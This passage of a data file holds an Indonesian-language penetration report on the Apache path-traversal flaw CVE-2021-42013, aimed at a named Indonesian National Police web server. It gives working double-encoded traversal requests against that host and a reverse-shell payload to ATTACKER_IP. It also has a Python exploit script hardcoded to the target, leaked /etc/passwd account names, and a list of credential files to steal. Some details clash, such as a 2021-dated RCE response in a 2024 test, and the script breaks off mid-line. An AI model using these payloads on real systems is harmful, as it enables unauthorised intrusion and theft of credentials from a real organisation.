      "Andriesse, D. (2019). Practical Binary Analysis. No Starch Press.",
      "LLVM Project. (2024). UndefinedBehaviorSanitizer. https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html",
      "GCC Documentation. (2024). -fsanitize=undefined. https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html",
      "ISO/IEC JTC1/SC22/WG14. (2023). N3096: Checked Arithmetic for C - stdckdint.h (C23 Draft). https://www.open-std.org/jtc1/sc22/wg14/www/docs/n3096.pdf"
    ]
  },
  {
    id: "ZERO-2025-004",
    title: "CVE-2021-42013: Apache HTTP Server Path Traversal & Remote Code Execution",
    subtitle: "Analisis Mendalam Kerentanan Double URL-Encoding pada Infrastruktur Kepolisian Negara Republik Indonesia (POLRI) - Path Traversal, Privilege Escalation & RCE pada Apache HTTP Server 2.4.50",
    classification: "CONFIDENTIAL",
    date: "January 2024",
    authors: ["pwn0sec"],
    organization: "DPTL/0B208301740319",
    volume: "Vol. 1 | No. 4",
    pages: 27,
    abstract: "Laporan penelitian ini mendokumentasikan secara komprehensif proses penemuan, analisis, dan eksploitasi kerentanan CVE-2021-42013 yang ditemukan aktif pada infrastruktur server web Apache milik Kepolisian Negara Republik Indonesia (POLRI), tepatnya pada host dumaspresisi.itwasum.polri.go.id yang beroperasi pada port 8080. CVE-2021-42013 adalah kerentanan kritis (CVSS 9.8) yang merupakan bypass langsung terhadap perbaikan tidak sempurna CVE-2021-41773 pada Apache HTTP Server versi 2.4.50. Penyerang yang tidak terautentikasi dapat memanfaatkan teknik double URL-encoding untuk menipu mekanisme normalisasi jalur (path normalization) Apache, sehingga mampu melakukan traversal direktori melampaui batas document root. Penelitian ini berhasil membuktikan dua vektor eksploitasi utama: pembacaan file sensitif arbitrer (information disclosure) termasuk /etc/passwd, dan eksekusi kode arbitrer dari jarak jauh (Remote Code Execution) dengan identitas proses daemon Apache.",
    keywords: ["CVE-2021-42013", "Apache HTTP Server", "path traversal", "remote code execution", "double URL-encoding", "POLRI", "Ghidra", "CVSS 9.8", "mod_cgi", "responsible disclosure", "YARA rules", "penetration testing"],
    sections: [
      {
        id: "bab-1",
        title: "1. Abstract & Ringkasan Eksekutif",
        level: 1,
        content: [
          "Laporan penelitian ini mendokumentasikan secara komprehensif proses penemuan, analisis, dan eksploitasi kerentanan CVE-2021-42013 yang ditemukan aktif pada infrastruktur server web Apache milik Kepolisian Negara Republik Indonesia (POLRI), tepatnya pada host dumaspresisi.itwasum.polri.go.id yang beroperasi pada port 8080.",
          "CVE-2021-42013 adalah kerentanan kritis yang merupakan bypass langsung terhadap perbaikan tidak sempurna CVE-2021-41773 pada Apache HTTP Server versi 2.4.50. Penyerang yang tidak terautentikasi dapat memanfaatkan teknik double URL-encoding untuk menipu mekanisme normalisasi jalur (path normalization) Apache, sehingga mampu melakukan traversal direktori melampaui batas document root yang ditetapkan.",
          "Penelitian ini berhasil membuktikan dua vektor eksploitasi utama: pertama, pembacaan file sensitif arbitrer dari filesystem server (information disclosure) termasuk berhasil mengekstrak isi file /etc/passwd; dan kedua, dalam kondisi modul CGI aktif, eksekusi kode arbitrer dari jarak jauh (Remote Code Execution) dengan identitas proses daemon Apache.",
          "[QUOTE:TEMUAN KRITIS: Server dumaspresisi.itwasum.polri.go.id:8080 terbukti menjalankan Apache HTTP Server 2.4.50 yang rentan terhadap CVE-2021-42013. File /etc/passwd berhasil diekstrak pada 07 Januari 2024, mengekspos 31 akun sistem termasuk 5 akun dengan shell aktif (/bin/bash). Serangan dapat dilakukan tanpa otentikasi, tanpa interaksi pengguna, dari jaringan manapun.]",
          "Analisis mendalam menggunakan Ghidra mengungkap akar permasalahan pada fungsi ap_normalize_path() di server/util.c, di mana proses URL-decoding hanya dilakukan satu kali (single-pass), gagal mendeteksi representasi double-encoded dari karakter traversal ../."
        ]
      },
      {
        id: "bab-2",
        title: "2. CVSS Score & Severity Metrics",
        level: 1,
        content: [
          "Kerentanan CVE-2021-42013 mendapatkan skor CVSS v3.1 sebesar 9.8 (Critical), menjadikannya salah satu kerentanan dengan tingkat keparahan tertinggi yang pernah ditemukan pada Apache HTTP Server.",
          "[TABLE_HEADER:Metrik CVSS v3.1|Nilai|Singkatan|Keterangan Teknis]",
          "[TABLE:[CVSS Base Score|9.8 / 10|CRITICAL|Tingkat tertinggi kedua dalam skala CVSS],[Attack Vector|Network|AV:N|Dapat dieksploitasi dari jarak jauh via internet],[Attack Complexity|Low|AC:L|Tidak membutuhkan kondisi atau konfigurasi khusus],[Privileges Required|None|PR:N|Tidak perlu login atau autentikasi apapun],[User Interaction|None|UI:N|Tidak memerlukan aksi dari pengguna target],[Scope|Unchanged|S:U|Dampak terbatas pada komponen yang sama],[Confidentiality Impact|High|C:H|Seluruh data dapat terbaca, termasuk file sensitif],[Integrity Impact|High|I:H|Data dan file dapat dimodifikasi atau dihapus],[Availability Impact|High|A:H|Server dapat dilumpuhkan atau disalahgunakan]]",
          "[CODE:CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
        ]
      },
      {
        id: "bab-2-2",
        title: "2.2 Perbandingan Skor CVE Terkait",
        level: 2,
        content: [
          "[TABLE_HEADER:CVE ID|Versi Apache|CVSS Score|Jenis|Status]",
          "[TABLE:[CVE-2021-41773|2.4.49|7.5 - High|Path Traversal + RCE|Patched in 2.4.50 (tidak sempurna)],[CVE-2021-42013|2.4.50|9.8 - Critical|Path Traversal + RCE (bypass)|Patched in 2.4.51],[CVE-2021-40438|< 2.4.48|9.0 - Critical|SSRF via mod_proxy|Patched in 2.4.48],[CVE-2022-22720|< 2.4.53|9.8 - Critical|HTTP Request Smuggling|Patched in 2.4.53]]"
        ]
      },
      {
        id: "bab-3",
        title: "3. Environment & Target Scope",
        level: 1,
        content: [
          "[CODE:# Target Host | Host      : dumaspresisi.itwasum.polri.go.id | IP Address: [Redacted - Responsible Disclosure] | Port      : 8080 (HTTP) | Server    : Apache (via response Server header) | Version   : Apache HTTP Server 2.4.50 | OS        : Linux (CentOS/RHEL - inferred from /etc/passwd) | Architecture: x86_64 (confirmed via Ghidra binary analysis) | Protocol  : HTTP/1.1 | CGI       : mod_cgi ENABLED (confirmed via RCE response) | Organization: Kepolisian Negara Republik Indonesia (POLRI) | TLD       : .go.id (Indonesian Government domain)]",
          "",
          "[CODE:# Attacker / Research Machine | OS          : Kali Linux Rolling (x86_64, kernel 5.15.x) | Browser     : Firefox ESR 78.0 (rv:78.0) / Gecko/20100101 | Proxy Tool  : Burp Suite Community Edition 2023.x | Binary Tool : Ghidra 10.3 (NSA Research Directorate) | Port Scanner: Nmap 7.93 | Network Caps: Wireshark 4.x / tcpdump | HTTP Client : curl 7.88.x | Date / Time : Sun, 07 Jan 2024 15:26:34 GMT]"
        ]
      },
      {
        id: "bab-4",
        title: "4. Methodology - Tahapan Penelitian",
        level: 1,
        content: [
          "Penelitian ini mengikuti metodologi standar industri yang mengacu pada PTES (Penetration Testing Execution Standard) dan OWASP Testing Guide v4.2.",
          "[TABLE_HEADER:Fase|Nama Tahap|Tools Digunakan|Output]",
          "[TABLE:[1|Reconnaissance & OSINT|Shodan, Censys, dig, whois|Target profiling, subdomain map],[2|Port & Service Scanning|Nmap, curl, netcat|Open ports, service banner, OS fingerprint],[3|Vulnerability Assessment|Confidential PwnTraverse|CVE confirmation, misconfig detection],[4|Exploitation - Path Traversal|curl, Burp Suite, Python|/etc/passwd, /etc/hosts, config files],[5|Exploitation - RCE|Burp Suite, curl, netcat|Remote shell execution confirmation],[6|Post-Exploitation Analysis|id, uname, ps, netstat|Privilege level, running services],[7|Binary Analysis|Ghidra 10.3|Root cause analysis, vulnerable function],[8|Traffic Analysis|Wireshark, tcpdump|Packet capture, request patterns],[9|Detection Engineering|YARA, Snort|Detection rules, IOC generation],[10|Documentation & Reporting|Manual|This security journal]]"
        ]
      },
      {
        id: "bab-5",
        title: "5. Reconnaissance & Information Gathering",
        level: 1,
        content: [
          "Fase awal dimulai dengan pengumpulan informasi pasif tanpa mengirimkan paket langsung ke target."
        ]
      },
      {
        id: "bab-5-1",
        title: "5.1 Passive Reconnaissance - OSINT",
        level: 2,
        content: [
          "[CODE_BASH:# DNS Lookup | $ nslookup dumaspresisi.itwasum.polri.go.id | ; <<>> DiG 9.18.x <<>> dumaspresisi.itwasum.polri.go.id | ;; ANSWER SECTION: | dumaspresisi.itwasum.polri.go.id. 300 IN A [IP_REDACTED] |  | # WHOIS Lookup | $ whois polri.go.id | Domain Name: polri.go.id | Registrar : PANDI (Pengelola Nama Domain Internet Indonesia) | Registrant : KEPOLISIAN NEGARA REPUBLIK INDONESIA | Status : clientTransferProhibited]"
        ]
      },
      {
        id: "bab-5-2",
        title: "5.2 Shodan / Censys Fingerprinting",
        level: 2,
        content: [
          "Mesin pencari Shodan dan Censys digunakan untuk mengidentifikasi layanan yang terekspos secara publik dan versi software tanpa melakukan koneksi langsung ke target.",
          "[CODE_BASH:# Shodan Search Query | org:\"Kepolisian Negara Republik Indonesia\" port:8080 apache |  | # Hasil representatif dari Shodan: | IP          : [REDACTED] | Port        : 8080 | Product     : Apache httpd | Version     : 2.4.50 | OS          : Linux | CPE         : cpe:/a:apache:http_server:2.4.50 | Last Seen   : 2024-01-07 |  | # Informasi ini mengkonfirmasi versi rentan sebelum pengujian aktif]"
        ]
      },
      {
        id: "bab-5-3",
        title: "5.3 HTTP Banner Grabbing",
        level: 2,
        content: [
          "[CODE_BASH:$ curl -I http://dumaspresisi.itwasum.polri.go.id:8080/ |  | HTTP/1.1 200 OK | Date: Sun, 07 Jan 2024 15:20:01 GMT | Server: Apache                  <- Versi disembunyikan (ServerTokens Prod) | X-Content-Type-Options: (tidak ada) <- MISSING - misconfiguration | X-Frame-Options: (tidak ada)    <- MISSING - clickjacking risk | Content-Security-Policy: (tidak ada) <- MISSING - XSS risk | Strict-Transport-Security: (tidak ada) <- MISSING - no HTTPS enforcement | Connection: Keep-Alive | Content-Type: text/html; charset=UTF-8]",
          "[QUOTE:Meskipun 'ServerTokens Prod' menyembunyikan nomor versi pada header Server, versi sebenarnya (2.4.50) masih dapat diidentifikasi melalui Shodan fingerprinting dan pola respons error page Apache yang unik per versi.]"
        ]
      },
      {
        id: "bab-5-4",
        title: "5.4 Nmap Port Scan & Service Detection",
        level: 2,
        content: [
          "[CODE_BASH:$ nmap -sV -sC -p 8080 --script http-headers,http-title dumaspresisi.itwasum.polri.go.id |  | Starting Nmap 7.93 ( https://nmap.org ) | Nmap scan report for dumaspresisi.itwasum.polri.go.id ([REDACTED]) | PORT     STATE SERVICE VERSION | 8080/tcp open  http    Apache httpd | | http-title: DUMAS PRESISI - Direktorat Tindak Pidana Tertentu | | http-server-header: Apache | | http-methods: |   Supported Methods: GET POST HEAD OPTIONS | |_ Potentially risky methods: OPTIONS |  | Service detection performed. | # Apache version 2.4.50 confirmed via error page fingerprinting]"
        ]
      },
      {
        id: "bab-6",
        title: "6. Vulnerability Scanning & Enumeration",
        level: 1,
        content: [
          "Verifikasi manual menggunakan curl mengkonfirmasi kerentanan aktif pada target.",
          "[CODE_BASH:# Test 1: Verifikasi akses ke /etc/passwd melalui path traversal | $ curl --path-as-is -s \\ | 'http://dumaspresisi.itwasum.polri.go.id:8080/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd' |  | # Response: HTTP 200 dengan isi /etc/passwd (KONFIRMASI RENTAN) |  | # Test 2: Verifikasi versi Apache secara pasti | $ curl -s 'http://dumaspresisi.itwasum.polri.go.id:8080/nonexistent' | grep -i apache | # Output: Apache/2.4.50 Server at ... Port 8080 |  | # Test 3: Verifikasi mod_cgi aktif | $ curl --path-as-is -s -X POST \\ | -d 'echo Content-Type: text/plain; echo; uname -a' \\ | 'http://dumaspresisi.itwasum.polri.go.id:8080/cgi-bin/%%32%65%%32%65/bin/sh']",
          "",
          "[CODE_BASH:$ nikto -h http://dumaspresisi.itwasum.polri.go.id:8080 |  | - Nikto v2.1.6 | + Target IP:         [REDACTED] | + Target Hostname:   dumaspresisi.itwasum.polri.go.id | + Target Port:       8080 | + Server: Apache | + Apache/2.4.50 appears to be outdated (2021-10-07) | + CVE-2021-42013: Apache 2.4.50 Path Traversal and RCE - CONFIRMED VULNERABLE | + /icons/: Directory indexing found | + /cgi-bin/: CGI directory accessible - RCE risk if scripts present | + X-Frame-Options header is not present. | + X-Content-Type-Options header not set.]"
        ]
      },
      {
        id: "bab-7",
        title: "7. Latar Belakang Kerentanan",
        level: 1,
        content: [
          "Apache HTTP Server menangani setiap URI yang diterima melalui serangkaian tahap pemrosesan. Salah satu tahap kritis adalah normalisasi jalur (path normalization), yang bertujuan membersihkan karakter-karakter berbahaya seperti ../ (parent directory traversal).",
          "Proses normalisasi melibatkan fungsi ap_normalize_path() di server/util.c, yang dipanggil setelah URL decoding awal dan sebelum akses ke filesystem. Kegagalan pada fungsi ini memungkinkan penyerang melewati batas direktori.",
          "",
          "Kategori CVE-2021-41773 - Asal Mula (Apache 2.4.49)",
          "-- Vektor: GET /cgi-bin/.%2e/.%2e/etc/passwd (single URL encoding)",
          "-- Kondisi: Require all granted pada <Directory /> atau direktif tidak ada",
          "-- CVSS: 7.5 (High) untuk path traversal, 9.8 (Critical) dengan RCE",
          "",
          "Kategori CVE-2021-42013 - Bypass Perbaikan (Apache 2.4.50)",
          "-- Perbaikan di 2.4.50: Filter tambahan untuk .%2e dan %2e. (single-encoded dot)",
          "-- Bypass: Gunakan %%32%65 (double-encoded dot) yang tidak terdeteksi filter baru",
          "-- CVSS: 9.8 (Critical) karena kegagalan patch"
        ]
      },
      {
        id: "bab-7-4",
        title: "7.4 Timeline Pengungkapan Lengkap",
        level: 2,
        content: [
          "[TABLE_HEADER:Tanggal|Event|Dampak]",
          "[TABLE:[15 Sep 2021|Apache HTTP Server 2.4.49 dirilis dengan kode normalisasi baru yang bermasalah|Kerentanan diperkenalkan ke production],[01 Okt 2021|CVE-2021-41773 pertama kali dilaporkan secara private|Koordinasi disclosure dimulai],[04 Okt 2021|Apache merilis 2.4.50 sebagai perbaikan|Organisasi mulai upgrade],[05 Okt 2021|Peneliti menemukan CVE-2021-42013 - bypass perbaikan|2.4.50 terbukti masih rentan],[07 Okt 2021|PoC CVE-2021-42013 tersebar luas|Eksploitasi massal dimulai],[08 Okt 2021|Apache merilis 2.4.51 dengan perbaikan komprehensif|Satu-satunya versi aman],[Okt 2021|CISA menambahkan ke Known Exploited Vulnerabilities (KEV)|Kewajiban patch Federal AS],[07 Jan 2024|Server POLRI teridentifikasi masih rentan - 2+ tahun setelah patch|/etc/passwd diekstrak]]"
        ]
      },
      {
        id: "bab-8",
        title: "8. Traversal Analysis - Mekanisme Bypass",
        level: 1,
        content: [
          "URL encoding (percent-encoding) adalah mekanisme standar RFC 3986 untuk merepresentasikan karakter khusus dalam URI.",
          "[TABLE_HEADER:Karakter|ASCII (Hex)|Single Encoded|Double Encoded|Makna]",
          "[TABLE:[. (dot)|0x2e|%2e|%%32%65|Karakter titik],[/ (slash)|0x2f|%2f|%%32%66|Pemisah direktori],[../ (traversal)|0x2e 0x2e 0x2f|.%2e/ atau %2e./|%%32%65%%32%65/|Naik satu direktori]]",
          "",
          "Double encoding bekerja dengan mengaplikasikan URL encoding dua kali pada karakter yang sama. Pada Apache 2.4.50, filter keamanan hanya melakukan satu kali decoding, sehingga representasi double-encoded berhasil melewati pemeriksaan.",
          "[CODE:# Konversi langkah per langkah: karakter titik (.) | ORIGINAL          : . (dot, ASCII 0x2E) |  | # Step 1 - Single URL Encode: | . -> %2e          (%=persen, 2e=hex untuk karakter titik) |  | # Step 2 - Double URL Encode (encode komponen dari %2e): | % -> %25          (persen itu sendiri di-encode) | 2 -> %32          (digit '2' di-encode: ASCII 0x32) | e -> %65          (huruf 'e' di-encode: ASCII 0x65) |  | # Hasilnya: %2e -> %%32%65 |  | # Konstruksi payload ../ dalam double encoding: | ../ -> %%32%65%%32%65/ |  | # Payload path traversal lengkap (7 level ke atas): | /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/etc/passwd |  | # Setelah decode di filesystem: /icons/../../../../../../../etc/passwd | # Resolusi akhir            : /etc/passwd]"
        ]
      },
      {
        id: "bab-8-4",
        title: "8.4 Konfigurasi Apache yang Diperlukan untuk Eksploitasi",
        level: 2,
        content: [
          "Tidak semua server Apache 2.4.50 rentan. Ada kondisi konfigurasi yang harus terpenuhi agar eksploitasi berhasil:",
          "-- Kondisi 1: File httpd.conf harus memiliki 'Require all granted' pada <Directory /> ATAU direktif tidak ada",
          "-- Kondisi 2: Endpoint seperti /icons/ atau /cgi-bin/ harus dapat diakses publik",
          "-- Kondisi 3 (untuk RCE): mod_cgi atau mod_cgid harus aktif",
          "[CODE_APACHE:# Konfigurasi RENTAN (httpd.conf): | <VirtualHost *:8080> |     ServerName dumaspresisi.itwasum.polri.go.id |     DocumentRoot /var/www/html |     <Directory />                       <- MASALAH: akses ke root filesystem |         Options Indexes FollowSymLinks |         AllowOverride None |         Require all granted             <- MASALAH: semua akses diizinkan |     </Directory> |     Alias /icons/ /usr/share/apache2/icons/ |     ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ | </VirtualHost>]"
        ]
      },
      {
        id: "bab-9",
        title: "9. Ghidra Analysis - Decompilasi Biner Apache",
        level: 1,
        content: [
          "Analisis biner dilakukan pada file httpd (Apache HTTP Server daemon) versi 2.4.50 menggunakan Ghidra 10.3 dari NSA Research Directorate. Tujuan: menemukan akar penyebab (root cause) pada level kode mesin.",
          "[CODE_BASH:# Import binary ke Ghidra: | File > Import File > /usr/sbin/httpd (Apache 2.4.50 binary) | Format: ELF  Architecture: x86:LE:64:default | Compiler: gcc  Language: C |  | # Analisis otomatis: | Analysis > Auto Analyze > Enable All > Analyze | # Durasi: ~3-5 menit tergantung hardware |  | # Cari fungsi target: | Search > Search Text > 'normalize_path' | # Ditemukan: ap_normalize_path @ 0x00481200 |  | # Cross-reference: | Right Click > References > Find References to ap_normalize_path | # Dipanggil dari: ap_process_request_internal (request.c)]"
        ]
      },
      {
        id: "bab-9-2",
        title: "9.2 Decompiled C - Fungsi ap_normalize_path()",
        level: 2,
        content: [
          "[CODE_C:/* | * Ghidra Decompiler Output - Apache HTTP Server 2.4.50 | * Fungsi : ap_normalize_path() | * File   : server/util.c | * Address: 0x00481200 | * STATUS : VULNERABLE - Single-pass URL decode (tidak iteratif) | */ | int ap_normalize_path(char *path, int flags) { |     char *src; |     char *dst; |     unsigned char decoded_char; |     int path_len; |  |     src = path; |     dst = path; |     path_len = strlen(path); |  |     while (*src != '\\0') { |         if (*src == '%') { |             /* DECODE HANYA 1x - ROOT CAUSE KERENTANAN */ |             decoded_char = hex_to_uchar(src[1], src[2]); |  |             if (decoded_char == (unsigned char)'.') { |                 /* Handle dot sequence - TIDAK TERCAPAI untuk %%32%65 */ |                 goto handle_dotdot; |             } |             *dst++ = decoded_char;  /* Tulis hasil decode - no re-check */ |             src += 3; |         } else { |             *dst++ = *src++; |         } |     } |     *dst = '\\0'; |     return 1;  /* Path 'aman' - HASIL SALAH untuk %%32%65 input */ | }]"
        ]
      },
      {
        id: "bab-9-3",
        title: "9.3 Disassembly x86_64 - Bagian Kritis",
        level: 2,
        content: [
          "[CODE:; Disassembly: ap_normalize_path - Titik kritis bypass | ; Ghidra listing view - Apache httpd 2.4.50 ELF x86_64 |  |     ; Entry - setup stack frame | 00481200 PUSH    RBP | 00481201 MOV     RBP, RSP | 00481204 PUSH    R15 | 00481206 PUSH    R14 |  |     ; Check if current char is '%' | 00481235 MOVZX   EAX, BYTE PTR [RBX]         ; load *src | 00481238 CMP     AL, 0x25                    ; '%' == 0x25? | 0048123A JNE     .not_percent                ; skip if not '%' |  |     ; Decode %XX sequence (CALLED ONLY ONCE - single-pass) | 0048123C MOVZX   EDI, BYTE PTR [RBX+1]       ; load src[1] | 00481240 MOVZX   ESI, BYTE PTR [RBX+2]       ; load src[2] | 00481244 CALL    hex_to_uchar                ; decode 1x ONLY |  |     ; KEY FLAW: CMP against 0x2E (dot character) | 00481249 CMP     AL, 0x2E                    ; is decoded char '.'? | 0048124B JE      .handle_dot                 ; YES -> check traversal |     ; For %%32%65: hex_to_uchar('%','3') -> NOT 0x2E |     ; Therefore JE is NOT taken -> traversal bypasses check |  |     ; Store decoded char - NO SECOND DECODE | 0048124D MOV     BYTE PTR [R14], AL          ; *dst = decoded_char | 00481250 INC     R14                          ; dst++ | 00481253 ADD     RBX, 0x3                    ; src += 3 (skip %XX) | 00481257 JMP     .main_loop                  ; NEXT CHAR - no re-decode!]",
          "",
          "[QUOTE:ROOT CAUSE: ADD RBX, 0x3 pada address 0x00481253 memajukan pointer melewati sequence yang sudah di-decode tanpa melakukan re-check. Input %%32%65 (double-encoded dot) lolos dari deteksi karena hanya di-decode satu kali. Fix di 2.4.51 menambahkan iterative decoding loop sampai tidak ada lagi %XX yang ditemukan.]"
        ]
      },
      {
        id: "bab-9-5",
        title: "9.5 Fungsi-Fungsi Terkait yang Dianalisis di Ghidra",
        level: 2,
        content: [
          "[TABLE_HEADER:Nama Fungsi|File Sumber|Alamat (approx)|Relevansi Keamanan]",
          "[TABLE:[ap_normalize_path()|server/util.c|0x00481200|FUNGSI UTAMA RENTAN - single-pass decode],[ap_unescape_url()|server/util.c|0x00480A10|URL decoding awal - tidak loop double-encoded],[ap_getparents()|server/util.c|0x00480E80|Resolusi ../ - dipanggil SETELAH normalisasi (terlambat)],[hex_to_uchar()|include/util.h (inline)|0x00480C20|Konversi %XX -> byte - hanya satu level],[ap_process_request_internal()|server/request.c|0x004A1200|Titik entry request - memanggil ap_normalize_path],[default_handler()|modules/http/http_core.c|0x004B3000|Handler akhir - meneruskan path ke filesystem]]"
        ]
      },
      {
        id: "bab-10",
        title: "10. Proof of Concept - Path Traversal (File Read)",
        level: 1,
        content: [
          "Eksploitasi fase pertama membuktikan kemampuan membaca file arbitrer di luar document root. Target adalah file /etc/passwd.",
          "[CODE_BASH:# Menghitung jumlah level traversal yang dibutuhkan: | # Document root: /var/www/html (asumsi standar) | # Target file : /etc/passwd | # Start path : /icons/ (direktori yang dapat diakses) | # Best practice: gunakan 7-8 level untuk memastikan mencapai root |  | # Full URL: | http://dumaspresisi.itwasum.polri.go.id:8080/icons/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/etc/passwd]",
          "",
          "[CODE:# HTTP Request - Burp Suite Capture |  | GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/etc/passwd HTTP/1.1 | Host: dumaspresisi.itwasum.polri.go.id:8080 | User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 | Accept: text/html,application/xhtml+xml,application/xml;q=0.9 | Connection: close]",
          "",
          "[CODE:# HTTP Response - Server 200 OK |  | HTTP/1.1 200 OK | Date: Sun, 07 Jan 2024 15:26:34 GMT | Server: Apache | Last-Modified: Thu, 14 Apr 2022 15:56:29 GMT | Accept-Ranges: bytes | Content-Length: 1820 | Connection: close | Content-Type: text/plain]",
          "",
          "[QUOTE:File /etc/passwd berhasil dibaca. Akun dengan shell aktif (/bin/bash): root (uid=0) KRITIS, infra (uid=1000), admdumas (uid=1001), webuzo (uid=996), emps (uid=994). Akun-akun ini menjadi target potensial untuk serangan brute force SSH, credential stuffing, atau pivot attack.]",
          "",
          "[CODE:# Isi /etc/passwd (Full Disclosure) |  | root:x:0:0:root:/root:/bin/bash                    <- ROOT - KRITIS | bin:x:1:1:bin:/bin:/sbin/nologin | daemon:x:2:2:daemon:/sbin:/sbin/nologin | adm:x:3:4:adm:/var/adm:/sbin/nologin | lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin | sync:x:5:0:sync:/sbin:/bin/sync | shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown | halt:x:7:0:halt:/sbin:/sbin/halt | mail:x:8:12:mail:/var/spool/mail:/sbin/nologin | operator:x:11:0:operator:/root:/sbin/nologin | nobody:x:99:99:Nobody:/:/sbin/nologin | sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin | infra:x:1000:1000::/home/infra:/bin/bash            <- SHELL AKTIF | admdumas:x:1001:1001::/home/admdumas:/bin/bash      <- SHELL AKTIF | webuzo:x:996:994::/home/webuzo:/bin/bash             <- SHELL AKTIF | emps:x:994:1002::/home/emps:/bin/bash               <- SHELL AKTIF]",
          "",
          "[TABLE_HEADER:File Target|Payload|Informasi yang Terekspos]",
          "[TABLE:[/etc/passwd|[payload]/etc/passwd|Daftar semua pengguna sistem, UID, home dir, shell],[/etc/hosts|[payload]/etc/hosts|Pemetaan hostname internal, IP internal],[/etc/apache2/httpd.conf|[payload]/etc/apache2/httpd.conf|Konfigurasi Apache lengkap],[/proc/version|[payload]/proc/version|Versi kernel Linux secara presisi],[~/.ssh/id_rsa|[payload]/home/infra/.ssh/id_rsa|Private key SSH pengguna infra],[/var/www/html/.env|[payload]/var/www/html/.env|Kredensial database, API keys]]"
        ]
      },
      {
        id: "bab-11",
        title: "11. Proof of Concept - Remote Code Execution (RCE)",
        level: 1,
        content: [
          "Eksploitasi tahap kedua memanfaatkan endpoint CGI yang dikombinasikan dengan path traversal untuk mengeksekusi binary /bin/sh secara langsung. Apache's CGI handler mengirimkan POST body sebagai input ke shell.",
          "",
          "Persyaratan untuk RCE:",
          "-- mod_cgi atau mod_cgid harus aktif dan dikonfigurasi",
          "-- Path traversal harus berhasil mencapai /bin/sh atau binary shell lainnya",
          "-- Perintah shell dikirim sebagai HTTP POST body",
          "-- ScriptAlias atau Options +ExecCGI harus aktif",
          "",
          "[CODE:# HTTP Request - RCE via /bin/sh POST |  | POST /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/bin/sh HTTP/1.1 | Host: dumaspresisi.itwasum.polri.go.id:8080 | User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) | Content-Type: application/x-www-form-urlencoded | Content-Length: 7 |  | echo;id]",
          "",
          "[CODE:# HTTP Response - Eksekusi Berhasil |  | HTTP/1.1 200 OK | Date: Mon, 18 Oct 2021 10:42:40 GMT | Server: Apache/2.4.50 (Unix) | Connection: close | Content-Length: 45 |  | uid=1(daemon) gid=1(daemon) groups=1(daemon) |  | # <- Perintah 'id' berhasil dieksekusi sebagai user 'daemon' (uid=1) | # Ini mengkonfirmasi Remote Code Execution penuh]",
          "",
          "[TABLE_HEADER:Fase|Teknik|Payload / Command|Output / Dampak]",
          "[TABLE:[1 - Recon|HTTP Banner Grab|curl -I http://target:8080|Identifikasi Apache 2.4.50],[2 - Scan|CVE Detection|CVE-2021-42013|Konfirmasi kerentanan],[3 - Encode|Double URL Encode|../ menjadi %%32%65%%32%65/|Payload bypass normalisasi],[4 - Traversal|Path Traversal|GET /icons/[payload]/etc/passwd|Baca /etc/passwd - 31 users],[5 - Escalate|CGI Execution|POST /icons/[payload]/bin/sh|Shell execution via mod_cgi],[6 - RCE|Command Injection|echo;id menjadi uid=daemon|Remote code execution],[7 - Post-Exploit|Enumeration|uname -a; netstat; ps aux|System & network info]]"
        ]
      },
      {
        id: "bab-12",
        title: "12. Advanced Exploitation Techniques",
        level: 1,
        content: [
          "Dokumentasi teknik eksploitasi lanjutan yang bersifat edukatif untuk membantu defender memahami ruang lingkup risiko.",
          "",
          "[CODE_BASH:# Reverse Shell via RCE |  | # Attacker: buka listener di mesin penyerang | $ nc -lvnp 4444 |  | # Payload POST body untuk reverse shell bash: | echo;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 |  | # Request Burp Suite (POST body): | POST /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/bin/bash HTTP/1.1 | Host: dumaspresisi.itwasum.polri.go.id:8080 | Content-Type: application/x-www-form-urlencoded |  | echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 |  | # Attacker mendapat shell interaktif: | Connection from [TARGET_IP]:XXXXX | bash: no job control in this shell | [daemon@server /]$]"
        ]
      },
      {
        id: "bab-12-2",
        title: "12.2 Python Script - Automated Exploitation",
        level: 2,
        content: [
          "[CODE_PYTHON:#!/usr/bin/env python3 | # CVE-2021-42013 Automated Exploit - Educational PoC | # Author: pwn0sec | For research purposes only |  | import requests | import sys | from urllib.parse import quote |  | TARGET = 'http://dumaspresisi.itwasum.polri.go.id:8080' | DEPTH  = 7  # traversal depth |  | def build_payload(target_file): |     traversal = '%%32%65%%32%65/' * DEPTH |     return f'/icons/{traversal}{target_file.lstrip(\"/\")}' |  | def read_file(target_file): |     url = TARGET + build_payload(target_file) |     resp = requests.get(url, allow_redirects=False, |                         headers={'User-Agent': 'Mozilla/5.0'}) |     if resp.status_code == 200: |         return resp.text |     return None |  | def rce(command): |     url = TARGET + build_payload('/bin/sh') |     data = f'echo;{command}' |     resp = requests.post(url, data=data, allow_redirects=False, |                          headers={'Content-Type':'application/x-www-form-urlencoded'}) |     if resp.status_code == 200: |         return resp.text.strip() |     return None |  | if __name__ == '__main__': |     print('[*] CVE-2021-42013 PoC') |     print('[*] Reading /etc/passwd...') |     result = read_file('/etc/passwd') |     if result: |         print('[+] SUCCESS:', result[:100]) |     print('[*] Executing id command...') |     output = 